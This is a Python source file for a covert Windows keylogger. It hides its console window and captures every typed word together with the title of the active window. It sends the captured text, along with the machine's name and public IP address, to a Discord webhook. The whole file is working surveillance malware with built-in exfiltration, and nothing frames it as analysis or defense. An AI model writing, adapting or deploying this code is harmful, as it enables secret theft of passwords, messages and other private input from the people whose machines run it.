import os
import requests
import pygetwindow as gw
import win32gui
import win32console
import json
import discord
from pynput import keyboard
from pynput.keyboard import Key, KeyCode
from queue import Queue
import threading

webhook_url = "WEBHOOK_LINK_HERE"

pc_name = os.getenv('COMPUTERNAME')

public_ip = requests.get("https://httpbin.org/ip").json()["origin"]

requests.post(webhook_url, json={"content": f"{pc_name} ({public_ip}) opened the logger!"})

current_word = []
word_buffer = Queue()

def on_special_key_press(key):
    key_name = get_key_name(key)
    if key_name is not None:
        word_buffer.put(key_name)

def on_press(key):
    global current_word

    if key == keyboard.Key.space:
        word_buffer.put("".join(current_word))
        current_word = []
    else:
        try:
            char = key.char
            current_word.append(char)
        except AttributeError:
            on_special_key_press(key)

def on_release(key):
    if key == keyboard.Key.esc:
        word_buffer.put("".join(current_word))
        word_buffer.put(None)
        return False

def send_words_to_webhook():
    while True:
        word = word_buffer.get()
        if word is None:
            break
        window = gw.getActiveWindow()
        window_name = window.title

        if window_name and word:
            embed = {
                "title": f"Typing in window: {window_name}",
                "description": word,
                "color": 0x113d22,
                "footer": {
                    "text": f"Public IP: {public_ip}"
                },
                "thumbnail": {
                    "url": "YOUR_LOGO_LINK_HERE"
                }
            }
            payload = {
                "embeds": [embed]
            }
            requests.post(webhook_url, data=json.dumps(payload), headers={"Content-Type": "application/json"})

def get_key_name(key):
    if isinstance(key, KeyCode):
        if key == Key.ctrl_l or key == Key.ctrl_r:
            return "Key.ctrl"
        elif key == Key.alt_l or key == Key.alt_r:
            return "Key.alt"
        elif key == Key.shift_l or key == Key.shift_r:
            return "Key.shift"
    else:
        return str(key) if key is not None else None

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    sender_thread = threading.Thread(target=send_words_to_webhook)
    sender_thread.start()

    listener.join()

    sender_thread.join()

requests.post(webhook_url, json={"content": f"{pc_name} ({public_ip}) closed the logger!"})
